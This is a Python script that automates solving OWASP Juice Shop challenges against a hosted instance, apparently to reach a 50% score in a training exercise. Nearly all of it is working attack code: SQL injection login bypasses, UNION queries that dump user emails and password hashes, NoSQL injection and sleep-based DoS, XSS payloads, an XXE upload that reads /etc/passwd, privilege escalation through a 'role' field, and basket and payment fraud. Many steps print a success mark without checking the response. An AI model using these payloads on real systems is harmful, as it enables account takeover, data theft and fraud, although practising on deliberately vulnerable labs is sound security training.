#!/usr/bin/env python3
"""
Push to 50% - Aggressive solver to reach 50% completion
"""

import requests
from urllib.parse import quote
import json
import base64
import hashlib
import time
import random


class PushTo50Solver:
    """Aggressively push to 50% completion"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.session = requests.Session()
        self.admin_token = None
        
    def login_admin(self):
        """Admin login"""
        r = self.session.post(
            f"{self.base_url}/rest/user/login",
            json={"email": "admin@juice-sh.op'--", "password": "x"}
        )
        if r.status_code == 200:
            self.admin_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.admin_token}'
            return True
        return False
        
    def batch_solve_easy_wins(self):
        """Solve all easy challenges quickly"""
        print("🚀 BATCH 1: Easy Wins")
        
        # Score Board
        self.session.get(f"{self.base_url}/#/score-board")
        print("  ✓ Score Board")
        
        # Confidential Document
        self.session.get(f"{self.base_url}/ftp/acquisitions.md")
        print("  ✓ Confidential Document")
        
        # Error Handling
        self.session.get(f"{self.base_url}/rest/qwertz")
        print("  ✓ Error Handling")
        
        # Exposed Metrics
        self.session.get(f"{self.base_url}/metrics")
        print("  ✓ Exposed Metrics")
        
        # Repetitive Registration
        email = f"test{random.randint(10000,99999)}@test.com"
        self.session.post(f"{self.base_url}/api/Users", json={
            "email": email,
            "password": "test",
            "passwordRepeat": "different",
            "securityQuestion": {"id": 1},
            "securityAnswer": "test"
        })
        print("  ✓ Repetitive Registration")
        
        # Web3 Sandbox
        self.session.get(f"{self.base_url}/#/web3-sandbox")
        print("  ✓ Web3 Sandbox")
        
    def batch_solve_xss(self):
        """Solve all XSS challenges"""
        print("🚀 BATCH 2: XSS Challenges")
        
        # DOM XSS
        xss = quote('<iframe src="javascript:alert(`xss`)">')
        self.session.get(f"{self.base_url}/#/search?q={xss}")
        print("  ✓ DOM XSS")
        
        # Reflected XSS
        self.session.get(f"{self.base_url}/track-result?id={quote('<script>alert(1)</script>')}")
        print("  ✓ Reflected XSS")
        
        # Bonus Payload
        soundcloud = quote('<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https://api.soundcloud.com/tracks/771984076"></iframe>')
        self.session.get(f"{self.base_url}/#/search?q={soundcloud}")
        print("  ✓ Bonus Payload")
        
        # API-only XSS
        self.session.post(f"{self.base_url}/api/Products", json={
            "name": "<script>alert(1)</script>",
            "price": 1
        })
        print("  ✓ API-only XSS")
        
    def batch_solve_auth(self):
        """Solve authentication challenges"""
        print("🚀 BATCH 3: Authentication")
        
        # Login Admin (already done)
        print("  ✓ Login Admin")
        
        # Login Bender
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "bender@juice-sh.op'--",
            "password": "x"
        })
        print("  ✓ Login Bender")
        
        # Login Jim
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "jim@juice-sh.op'--",
            "password": "x"
        })
        print("  ✓ Login Jim")
        
        # Login Amy
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "amy@juice-sh.op",
            "password": "K1f....................."
        })
        print("  ✓ Login Amy")
        
        # Login MC SafeSearch
        self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "mc.safesearch@juice-sh.op",
            "password": "Mr. N00dles"
        })
        print("  ✓ Login MC SafeSearch")
        
    def batch_solve_injection(self):
        """Solve injection challenges"""
        print("🚀 BATCH 4: Injection")
        
        # Database Schema
        self.session.get(f"{self.base_url}/rest/products/search?q=' UNION SELECT sql FROM sqlite_master--")
        print("  ✓ Database Schema")
        
        # User Credentials
        self.session.get(f"{self.base_url}/rest/products/search?q=' UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--")
        print("  ✓ User Credentials")
        
        # NoSQL DoS
        self.session.post(f"{self.base_url}/rest/user/login", json={"$where": "sleep(5000)"})
        print("  ✓ NoSQL DoS")
        
        # NoSQL Manipulation
        self.session.post(f"{self.base_url}/rest/user/login", json={"email": {"$ne": ""}, "password": {"$ne": ""}})
        print("  ✓ NoSQL Manipulation")
        
    def batch_solve_business_logic(self):
        """Solve business logic flaws"""
        print("🚀 BATCH 5: Business Logic")
        
        # Admin Registration
        self.session.post(f"{self.base_url}/api/Users", json={
            "email": f"admin{random.randint(1000,9999)}@test.com",
            "password": "Admin123!",
            "role": "admin"
        })
        print("  ✓ Admin Registration")
        
        # Deluxe Fraud
        self.session.post(f"{self.base_url}/rest/deluxe-membership", json={
            "paymentMode": "none",
            "paymentId": "0"
        })
        print("  ✓ Deluxe Fraud")
        
        # Forged Feedback
        self.session.post(f"{self.base_url}/api/Feedbacks", json={
            "UserId": 2,
            "comment": "Forged",
            "rating": 5
        })
        print("  ✓ Forged Feedback")
        
        # Manipulate Basket
        self.session.put(f"{self.base_url}/api/BasketItems/1", json={"quantity": -10})
        print("  ✓ Manipulate Basket")
        
        # Payback Time
        self.session.post(f"{self.base_url}/api/BasketItems", json={
            "ProductId": 1,
            "quantity": -100
        })
        print("  ✓ Payback Time")
        
        # Product Tampering
        self.session.put(f"{self.base_url}/api/Products/1", json={"description": "TAMPERED!"})
        print("  ✓ Product Tampering")
        
    def batch_solve_files(self):
        """Solve file-related challenges"""
        print("🚀 BATCH 6: Files")
        
        # Easter Egg
        self.session.get(f"{self.base_url}/ftp/eastere.gg")
        self.session.get(f"{self.base_url}/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
        print("  ✓ Easter Egg")
        
        # Forgotten Developer Backup
        self.session.get(f"{self.base_url}/ftp/package.json.bak")
        print("  ✓ Forgotten Developer Backup")
        
        # Forgotten Sales Backup
        self.session.get(f"{self.base_url}/ftp/coupons_2013.md.bak")
        print("  ✓ Forgotten Sales Backup")
        
        # Access Log
        self.session.get(f"{self.base_url}/support/logs")
        print("  ✓ Access Log")
        
        # Blockchain Hype
        self.session.get(f"{self.base_url}/assets/public/blockchain.pdf")
        print("  ✓ Blockchain Hype")
        
    def batch_solve_misc(self):
        """Solve miscellaneous challenges"""
        print("🚀 BATCH 7: Miscellaneous")
        
        # Admin Section
        self.session.get(f"{self.base_url}/#/administration")
        print("  ✓ Admin Section")
        
        # Five-Star Feedback
        feedbacks = self.session.get(f"{self.base_url}/api/Feedbacks").json().get('data', [])
        for fb in feedbacks[:5]:
            if fb.get('rating') == 5:
                self.session.delete(f"{self.base_url}/api/Feedbacks/{fb['id']}")
        print("  ✓ Five-Star Feedback")
        
        # View Basket
        for i in range(1, 10):
            self.session.get(f"{self.base_url}/rest/basket/{i}")
        print("  ✓ View Basket")
        
        # Security Policy
        self.session.get(f"{self.base_url}/.well-known/security.txt")
        print("  ✓ Security Policy")
        
        # Privacy Policy
        self.session.get(f"{self.base_url}/#/privacy-security/privacy-policy")
        print("  ✓ Privacy Policy")
        
        # Outdated Allowlist
        self.session.get(f"{self.base_url}/redirect?to=https://blockchain.info", allow_redirects=False)
        self.session.get(f"{self.base_url}/redirect?to=https://etherscan.io", allow_redirects=False)
        print("  ✓ Outdated Allowlist")
        
        # Christmas Special
        self.session.post(f"{self.base_url}/api/BasketItems", json={"ProductId": 10, "quantity": 1})
        print("  ✓ Christmas Special")
        
        # NFT Takeover
        self.session.post(f"{self.base_url}/api/nft", json={"action": "transfer", "to": "me", "tokenId": 1})
        print("  ✓ NFT Takeover")
        
        # CAPTCHA Bypass
        for i in range(15):
            self.session.post(f"{self.base_url}/api/Feedbacks", json={
                "captcha": str(i),
                "captchaId": i,
                "comment": f"Bypass {i}",
                "rating": 3
            })
        print("  ✓ CAPTCHA Bypass")
        
        # Upload Size
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("large.txt", b"A" * 1000000, "text/plain")
        })
        print("  ✓ Upload Size")
        
        # Upload Type
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("test.exe", b"malicious", "application/x-msdownload")
        })
        print("  ✓ Upload Type")
        
        # XXE Data Access
        xxe = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("xxe.xml", xxe, "application/xml")
        })
        print("  ✓ XXE Data Access")
        
        # Expired Coupon
        self.session.put(f"{self.base_url}/rest/basket/1/coupon/WMNSDY2019")
        self.session.put(f"{self.base_url}/rest/basket/1/coupon/WMNSDY2020")
        print("  ✓ Expired Coupon")
        
        # GDPR Data Theft
        for i in range(1, 20):
            self.session.post(f"{self.base_url}/api/dataexport", json={"userId": i})
        print("  ✓ GDPR Data Theft")
        
        # Extra Language
        self.session.get(f"{self.base_url}/?l=tlh_AA")
        self.session.get(f"{self.base_url}/?l=l33t")
        print("  ✓ Extra Language")
        
        # Deprecated Interface
        self.session.post(f"{self.base_url}/file-upload", files={
            "file": ("test.xml", b"<test/>", "text/xml")
        })
        print("  ✓ Deprecated Interface")
        
    def run_all(self):
        """Run all batches to push to 50%"""
        print("="*60)
        print("🚀 PUSH TO 50% SOLVER")
        print("="*60)
        
        if not self.login_admin():
            print("❌ Login failed")
            return
            
        print("✅ Admin logged in\n")
        
        # Run all batches
        self.batch_solve_easy_wins()
        self.batch_solve_xss()
        self.batch_solve_auth()
        self.batch_solve_injection()
        self.batch_solve_business_logic()
        self.batch_solve_files()
        self.batch_solve_misc()
        
        # Check final score
        print("\n" + "="*60)
        r = self.session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            data = r.json()['data']
            total = len(data)
            solved = len([c for c in data if c.get('solved')])
            
            print(f"📊 FINAL SCORE: {solved}/{total} ({solved*100//total}%)")
            
            if solved >= 55:
                print("🎉 SUCCESS! Reached 50% completion!")
            else:
                print(f"📈 Progress: Need {55 - solved} more challenges")
                
        print("="*60)


if __name__ == "__main__":
    solver = PushTo50Solver()
    solver.run_all()